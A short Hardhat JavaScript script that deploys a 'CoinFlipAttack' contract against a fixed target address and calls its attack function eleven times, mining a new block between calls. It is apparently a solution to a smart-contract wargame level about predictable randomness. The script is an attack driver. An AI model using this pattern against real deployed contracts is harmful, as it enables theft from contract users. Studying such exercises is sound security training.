const { ethers } = require("hardhat");
const CONTRACT_ADDRESS = "0x94099942864EA81cCF197E9D71ac53310b1468D8";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const attackerFactory = await ethers.getContractFactory(
    `CoinFlipAttack`,
    signer
  );
  const attacker = await attackerFactory.deploy(CONTRACT_ADDRESS);

  for (let index = 0; index < 11; index++) {
    // Send the transaction
    try {
      const tx = await attacker.attack();
      await tx.wait();

      if (!tx) {
        return;
      }
      // simulate waiting 1 block
      await ethers.provider.send("evm_increaseTime", [1]); // add 1 second
      await ethers.provider.send("evm_mine", [
        /* timestamp */
      ]); // mine the next block
      console.log(await ethers.provider.getBlockNumber());
    } catch (error) {
      console.error("Error while sending transaction:", error);
      return false;
    }
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
